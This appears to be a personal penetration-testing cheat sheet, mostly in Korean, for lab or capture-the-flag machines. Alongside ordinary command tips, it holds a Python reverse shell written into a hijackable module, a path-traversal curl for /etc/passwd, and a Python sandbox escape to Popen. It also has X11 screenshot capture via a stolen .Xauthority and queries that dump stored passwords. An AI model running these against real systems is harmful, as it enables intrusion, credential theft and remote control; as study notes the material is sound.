<details>
  <summary><strong>Hex to ASCII</strong></summary>

```bash
# password : 504073737730726440313233212131323313917181922232526273031333435373839424349505154575861657475798283869091949598103106111114115119122123126130131134135
cat password | xxd -r -p
```
```powershell
Format-Hex <file>
```

</details>

---
<details>
  <summary><strong>sed</strong></summary>

```bash
sed -i '1i /cgi-bin/' test.txt

sed 's/,/\r\n/g' users.table
```
- `-i` : 직접 수정
- `1i` : 첫번째줄에 insert
- `s` : substitute

</details>

---
<details>
  <summary><strong>tar</strong></summary>

- tar가 소유자/그룹을 유지하려면 압축 해제하는 사용자가 해당 소유자/그룹으로 쓸 권한이 있어야 한다.(`root`유저로 압축하면 `root`유저로 압축을 해제해야 권한 유지)

```bash
# 압축
tar -cf target.tar foo bar

# 압축 해제
tar -xvzf target.tar
tar -xvzf target.tar.gz
tar -xvf filename.tar.bz2
```

</details>

---
<details>
  <summary><strong>sqlite3</strong></summary>
  
```bash
sqlite3 <dbname> .dump
sqlite3 credentials.db 'select name,password from users'

sqlite3 {dbname}
.headers on   # 컬럼 이름 출력
.mode column  # 표 형식으로 출력
.tables
select * from user;
.quit
```
  
</details>

---
<details>
  <summary><strong>CURL</strong></summary>

```bash
curl --path-as-is http://10.10.10.10/../../../../etc/passwd

curl -v http://localhost:8000

curl http://localhost -o output.txt
```
- `../../`와 같은 경로를 그대로 전달
- `-v`옵션으로 접속이 `NOT FOUND`인지 `UNAUTHORIZED`인지 확인.

</details>

---
<details>
  <summary><strong>PYTHON</strong></summary>

## Find Class
- https://book.hacktricks.wiki/en/generic-methodologies-and-resources/python/bypass-python-sandboxes/index.html?highlight=python#misc-python
- `CLASS`를 찾아서 RCE 실행.(Popen)
```python3
#i = 0;
#for c in [].__class__.__base__.__subclasses__():
#    if c.__name__=="P"+"op"+"en":
#        print(c.__name__);
#        print(i);
#    i+=1;

[].__class__.__base__.__subclasses__()[317]('ping 10.10.16.4',shell=True);
```

## Request Server Headers
```python3
import requests;
response = requests.head('http://help.htb/support/');

# response의 요소 확인.
dir(response)

print(response.headers);
```

## TIME to INT
- https://strftime.org/
```python3
from datetime import datetime;

currentTime = int(datetime.strptime(<currentDate>,<timeFormat>).timestamp());
```

## version check
```bash
pip freeze | grep -i git
```

## base64
```python3
import base64;

str = b"Heloo";

encoded = base64.b64encode(str);
decoded = base64.b64decode(encoded);
```

## cycle
```python3
import itertools;

array = [e^k^223 for e,k in zip(decoded,itertools.cycle(key))];
```

## bytearray
```python3
# array = [110, 118, 69, 102, 69, 75, 49, 54, 94, 49, 97, 77, 52, 36, 101, 55, 65, 99, 108, 85, 102, 56, 120, 36, 116, 82, 87, 120, 80, 87, 79, 49, 37, 108, 109, 122]
str = bytearray(array).decode;
```

## python2
- `python2`에서 `input`함수는 `eval`로 평가하여 실행.
```python2
# eval
__import__('os').system('id')
```

## Tuple
- 파이썬에서 `,`로 연결하면 튜플로 평가.
- 튜플로 평가할 경우 왼쪽에서 오른쪽으로 내부 연산을 모두 마친 후 튜플로 생성됨.
- `eval`

## PIP install
```bash
pip3 install searchor==2.4.0
```

## module
- 모듈이 없을 경우에 생성해서 exploit 가능
```bash
echo 'import pty;import socket,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.118.5",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")' > /home/walter/wificontroller.py
```

</details>

---
<details>
  <summary><strong>BASH</strong></summary>

- `bash`에서는 `TRUE/FALSE` 값이 존재하지 않는다.
- `exit` 명령어 이후의 명령어는 실행되지 않는다.

```bash
# 해당 경로 bashrc 내부의 환경변수,함수,명령어 등을 현재 셸에서 실행하는 명령.
. /opt/.bashrc

# 파일 크기가 0보다 큰지 검사.
[ -s log/photobomb.log ]

# 파일이 링크파일인지 검사.
[ -L log/photobomb.log ]

# 문자열 길이가 0인지 검사.
[ -z $CHECK_CONTENT ]

# 특권모드로 실행시 PATH INJECTION 불가.
bash -p
```

## ENV
- 환경변수를 전달할 때 `;`를 사용하면 다르게 해석된다.
- 공백으로 전달.
```bash
sudo ENV=<env> ./script
```

## $()
- 명령어 실행시 `$()`를 사용하면 먼저 실행이 된다.
```bash
127.0.0.$(echo 1)
```

## printf
```bash
# 변수 할당에 공백이 있으면 안된다.
for num in $(seq 1 10);do num=$(printf '%02d' $num);echo $num;done;
```

## date
```bash
date -d "2020-01-01 +0 day" +"%Y-%m-%d"
```
  
</details>

---
<details>
  <summary><strong>X11(.Xauthority)</strong></summary>

- https://book.hacktricks.wiki/en/network-services-pentesting/6000-pentesting-x11.html#screenshots-capturing

```bash
w
```
<img width="1103" height="103" alt="image" src="https://github.com/user-attachments/assets/9d532428-0519-4278-99f3-938062dc0a00" />

<br>
<br>

```bash
XAUTHORITY=/tmp/.Xauthority xdpyinfo -display :0

XAUTHORITY=/tmp/.Xauthority xwininfo -root -tree -display :0

XAUTHORITY=/tmp/.Xauthority xwd -root -screen -silent -display :0 > screenshot.xwd
```

</details>

---
<details>
  <summary><strong>7z</strong></summary>

```bash
7z l -slt uploaded-file-3422.zip 
```
- `l` : 리스팅
- `-slt` : 기술 정보 목록 표시.
  
</details>

---
<details>
  <summary><strong>GCC(cross compile)</strong></summary>

- `lws2_32` : 윈도우 네트워크 통신 링크파일 설정
- `WinExec` : 리눅스에서 컴파일 오류가 나오면 `windows.h`헤더 파일 확인.

```bash
# 크로스 컴파일
x86_64-w64-mingw32-gcc adduser.c -o adduser.exe

# 인자 위치 중요
x86_64-w64-mingw32-gcc -shared ex.c -lws2_32 -o adduser.dll
```
  
</details>

---
<details>
  <summary><strong>xlsx</strong></summary>

- `xlsx`파일이 열리지 않으면 압축을 해제해 내부 파일들을 탐색하여 정보를 얻을 수 있다.
  
</details>

---
<details>
  <summary><strong>VIM</strong></summary>

```
# 전부 대문자를 소문자로
:ggguG

# 공백 줄 제거
:%!sed '/^$/d'
```
  
</details>

---
<details>
  <summary><strong>Graphql</strong></summary>

- https://hacktricks.wiki/en/network-services-pentesting/pentesting-web/graphql.html?highlight=graphql
- `/query`를 붙여서 보기.
```bash
# query 확인
http://example.com/graphql?query={__schema%20{%0atypes%20{%0aname%0akind%0adescription%0afields%20{%0aname%0a}%0a}%0a}%0a}

# 소문자
http://example.com/graphql?query={user{username,password}}
```
  
</details>

---
<details>
  <summary><strong>jar</strong></summary>

```bash
jd-gui <.jar>
```
  
</details>

---
<details>
  <summary><strong>Runas 대체</strong></summary>

```powershell
$pass = ConvertTo-SecureString <password> -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential("Sniper\\Chris",$pass)
Invoke-Command -ComputerName Sniper -Credential $cred - ScriptBlock {whoami}
```
  
</details>

---
<details>
  <summary><strong>Linux dotnet runtimeconf.json</strong></summary>

```json
{
  "runtimeOptions": {
    "tfm": "net8.0",
    "framework": {
      "name": "Microsoft.NETCore.App",
      "version": "8.0.1"
    }
  }
}
```
```bash
dotnet UserInfo.exe
```
  
</details>
